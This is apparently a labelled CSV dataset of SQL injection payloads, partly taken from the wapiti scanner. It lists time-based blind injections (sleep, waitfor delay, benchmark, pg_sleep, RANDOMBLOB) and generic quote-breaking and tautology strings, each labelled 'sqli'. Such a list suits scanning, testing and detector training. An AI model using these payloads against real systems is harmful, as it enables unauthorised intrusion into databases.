payload,label
# from wapiti,sqli
sleep(5)#,sqli
1 or sleep(5)#,sqli
""" or sleep(5)#",sqli
' or sleep(5)#,sqli
""" or sleep(5)=""",sqli
' or sleep(5)=',sqli
1) or sleep(5)#,sqli
""") or sleep(5)=""",sqli
') or sleep(5)=',sqli
1)) or sleep(5)#,sqli
""")) or sleep(5)=""",sqli
')) or sleep(5)=',sqli
;waitfor delay '0:0:5'--,sqli
);waitfor delay '0:0:5'--,sqli
';waitfor delay '0:0:5'--,sqli
""";waitfor delay '0:0:5'--",sqli
');waitfor delay '0:0:5'--,sqli
""");waitfor delay '0:0:5'--",sqli
));waitfor delay '0:0:5'--,sqli
'));waitfor delay '0:0:5'--,sqli
"""));waitfor delay '0:0:5'--",sqli
"benchmark(10000000,MD5(1))#",sqli
"1 or benchmark(10000000,MD5(1))#",sqli
""" or benchmark(10000000,MD5(1))#",sqli
"' or benchmark(10000000,MD5(1))#",sqli
"1) or benchmark(10000000,MD5(1))#",sqli
""") or benchmark(10000000,MD5(1))#",sqli
"') or benchmark(10000000,MD5(1))#",sqli
"1)) or benchmark(10000000,MD5(1))#",sqli
""")) or benchmark(10000000,MD5(1))#",sqli
"')) or benchmark(10000000,MD5(1))#",sqli
pg_sleep(5)--,sqli
1 or pg_sleep(5)--,sqli
""" or pg_sleep(5)--",sqli
' or pg_sleep(5)--,sqli
1) or pg_sleep(5)--,sqli
""") or pg_sleep(5)--",sqli
') or pg_sleep(5)--,sqli
1)) or pg_sleep(5)--,sqli
""")) or pg_sleep(5)--",sqli
')) or pg_sleep(5)--,sqli
AND (SELECT * FROM (SELECT(SLEEP(5)))bAKL) AND 'vRxe'='vRxe,sqli
AND (SELECT * FROM (SELECT(SLEEP(5)))YjoC) AND '%'=',sqli
AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP),sqli
AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)--,sqli
AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)#,sqli
SLEEP(5)#,sqli
SLEEP(5)--,sqli
"SLEEP(5)=""",sqli
SLEEP(5)=',sqli
or SLEEP(5),sqli
or SLEEP(5)#,sqli
or SLEEP(5)--,sqli
"or SLEEP(5)=""",sqli
or SLEEP(5)=',sqli
waitfor delay '00:00:05',sqli
waitfor delay '00:00:05'--,sqli
waitfor delay '00:00:05'#,sqli
"benchmark(50000000,MD5(1))",sqli
"benchmark(50000000,MD5(1))--",sqli
"benchmark(50000000,MD5(1))#",sqli
"or benchmark(50000000,MD5(1))",sqli
"or benchmark(50000000,MD5(1))--",sqli
"or benchmark(50000000,MD5(1))#",sqli
pg_SLEEP(5),sqli
pg_SLEEP(5)--,sqli
pg_SLEEP(5)#,sqli
or pg_SLEEP(5),sqli
or pg_SLEEP(5)--,sqli
or pg_SLEEP(5)#,sqli
"'\""",sqli
AnD SLEEP(5),sqli
AnD SLEEP(5)--,sqli
AnD SLEEP(5)#,sqli
&&SLEEP(5),sqli
&&SLEEP(5)--,sqli
&&SLEEP(5)#,sqli
' AnD SLEEP(5) ANd '1,sqli
'&&SLEEP(5)&&'1,sqli
ORDER BY SLEEP(5),sqli
ORDER BY SLEEP(5)--,sqli
ORDER BY SLEEP(5)#,sqli
(SELECT * FROM (SELECT(SLEEP(5)))ecMj),sqli
(SELECT * FROM (SELECT(SLEEP(5)))ecMj)#,sqli
(SELECT * FROM (SELECT(SLEEP(5)))ecMj)--,sqli
"+benchmark(3200,SHA1(1))+'",sqli
+ SLEEP(10) + ',sqli
RANDOMBLOB(500000000/2),sqli
"AND 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))",sqli
"OR 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))",sqli
RANDOMBLOB(1000000000/2),sqli
"AND 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))",sqli
"OR 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))",sqli
"SLEEP(1)/*' or SLEEP(1) or '"" or SLEEP(1) or ""*/",sqli
#generic,sqli
',sqli
'',sqli
`,sqli
``,sqli
",",sqli
"""",sqli
"""""",sqli
/,sqli
//,sqli
\,sqli
\\,sqli
;,sqli
"' or """,sqli
-- or #,sqli
' OR '1,sqli
' OR 1 -- -,sqli
""" OR """" = """,sqli
""" OR 1 = 1 -- -",sqli
' OR '' = ',sqli
'=',sqli
'LIKE',sqli
'=0--+,sqli
